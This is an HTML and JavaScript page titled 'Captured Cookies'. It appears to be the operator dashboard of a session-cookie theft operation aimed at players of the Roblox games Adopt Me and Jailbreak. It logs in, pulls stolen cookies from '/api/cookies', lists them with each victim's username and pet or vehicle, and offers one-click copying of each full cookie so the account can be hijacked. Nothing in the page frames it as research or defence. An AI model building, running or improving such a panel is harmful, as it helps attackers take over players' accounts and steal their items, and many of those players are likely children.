<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captured Cookies</title>
  <style>
    :root { --bg:#0d1117; --surface:#161b22; --border:rgba(255,255,255,0.06); --text:#c9d1d9; --pink:#d6336c; --blue:#3a6ea5; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: 'Segoe UI', sans-serif; background:var(--bg); color:var(--text); display:flex; justify-content:center; min-height:100vh; padding:30px; }
    .container { width:100%; max-width:1200px; }
    .header { display:flex; align-items:center; justify-content:space-between; margin-bottom:32px; }
    .header h1 { font-size:24px; font-weight:600; color:#fff; }
    .btn { padding:8px 20px; border-radius:8px; font-weight:600; font-size:14px; cursor:pointer; text-decoration:none; transition:0.2s; }
    .btn-refresh { background:var(--blue); border:none; color:#fff; }
    .btn-refresh:hover { background:#4b82b8; }
    .btn-logout { background:var(--pink); border:none; color:#fff; }
    .btn-logout:hover { background:#e64980; }
    .filter-bar { display:flex; gap:8px; margin-bottom:24px; }
    .filter-btn { background:transparent; border:1px solid #30363d; color:#8b949e; padding:6px 18px; border-radius:20px; font-weight:600; font-size:13px; cursor:pointer; transition:0.2s; }
    .filter-btn.active { background:var(--blue); color:#fff; border-color:var(--blue); }
    .table-wrapper { background:var(--surface); border:1px solid var(--border); border-radius:16px; overflow:hidden; }
    table { width:100%; border-collapse:collapse; }
    th { text-align:left; padding:14px 18px; font-size:12px; text-transform:uppercase; letter-spacing:0.5px; color:#8b949e; border-bottom:1px solid var(--border); background:rgba(0,0,0,0.2); }
    td { padding:14px 18px; font-size:14px; border-bottom:1px solid var(--border); vertical-align:middle; }
    tr:last-child td { border-bottom:none; }
    .username { color:#fff; font-weight:600; }
    .game-badge { display:inline-block; padding:2px 8px; border-radius:12px; font-size:11px; font-weight:600; text-transform:uppercase; }
    .game-badge.adoptme { background:rgba(214,51,108,0.2); color:#ffb6d9; }
    .game-badge.jailbreak { background:rgba(58,110,165,0.2); color:#a0d2ff; }
    .detail { color:#8b949e; font-size:13px; }
    .cookie-cell { display:flex; align-items:center; gap:8px; }
    .cookie-text { font-family:monospace; font-size:13px; color:#c9d1d9; background:#0d1117; padding:6px 10px; border-radius:6px; word-break:break-all; max-width:300px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
    .copy-btn { background:#21262d; border:1px solid #30363d; color:#c9d1d9; padding:6px 12px; border-radius:6px; cursor:pointer; font-size:12px; font-weight:600; white-space:nowrap; }
    .copy-btn:hover { background:#30363d; }
    .empty { text-align:center; padding:60px 0; color:#8b949e; font-size:15px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Captured Cookies</h1>
      <div class="header-actions">
        <button class="btn btn-refresh" onclick="loadData()">Refresh</button>
        <a href="/logout" class="btn btn-logout">Logout</a>
      </div>
    </div>
    <div class="filter-bar">
      <button class="filter-btn active" data-filter="all">All</button>
      <button class="filter-btn" data-filter="adoptme">Adopt Me</button>
      <button class="filter-btn" data-filter="jailbreak">Jailbreak</button>
    </div>
    <div class="table-wrapper">
      <table>
        <thead>
          <tr><th>Time</th><th>Game</th><th>Username</th><th>Pet / Vehicle</th><th>Cookie</th><th></th></tr>
        </thead>
        <tbody id="tableBody"><tr><td colspan="6" style="text-align:center;">Loading...</td></tr></tbody>
      </table>
    </div>
  </div>
  <script>
    let allData = { jailbreak: [], adoptme: [] };
    let currentFilter = 'all';
    document.querySelectorAll('.filter-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentFilter = btn.dataset.filter;
        renderTable();
      });
    });
    async function loadData() {
      document.getElementById('tableBody').innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading...</td></tr>';
      try {
        const res = await fetch('/api/cookies');
        if (res.status === 401) { window.location.href = '/login'; return; }
        allData = await res.json();
        renderTable();
      } catch (err) {
        document.getElementById('tableBody').innerHTML = '<tr><td colspan="6" style="text-align:center;">Could not connect to server.</td></tr>';
      }
    }
    function renderTable() {
      const adoptme = (allData.adoptme || []).map(e => ({ ...e, game: 'adoptme' }));
      const jailbreak = (allData.jailbreak || []).map(e => ({ ...e, game: 'jailbreak' }));
      let all = [...adoptme, ...jailbreak];
      all.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
      if (currentFilter !== 'all') all = all.filter(e => e.game === currentFilter);
      const tbody = document.getElementById('tableBody');
      if (!all.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty">No cookies captured yet.</td></tr>'; return; }
      let html = '';
      all.forEach(entry => {
        const timeStr = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : 'Unknown';
        const gameLabel = entry.game === 'adoptme' ? 'Adopt Me' : 'Jailbreak';
        const gameClass = entry.game === 'adoptme' ? 'adoptme' : 'jailbreak';
        const detail = entry.game === 'jailbreak' ? (entry.vehicle || '---') : (entry.pet || '---');
        const cookiePreview = (entry.cookie || '').substring(0, 60);
        html += `<tr>
          <td style="white-space:nowrap;color:#8b949e;font-size:13px;">${timeStr}</td>
          <td><span class="game-badge ${gameClass}">${gameLabel}</span></td>
          <td class="username">${entry.username}</td>
          <td class="detail">${detail}</td>
          <td><div class="cookie-cell"><span class="cookie-text" title="${entry.cookie}">${cookiePreview}...</span></div></td>
          <td><button class="copy-btn" data-cookie="${entry.cookie.replace(/"/g, '&quot;')}">Copy</button></td>
        </tr>`;
      });
      tbody.innerHTML = html;
      document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          navigator.clipboard.writeText(btn.getAttribute('data-cookie')).then(() => {
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 2000);
          });
        });
      });
    }
    loadData();
  </script>
</body>
</html>
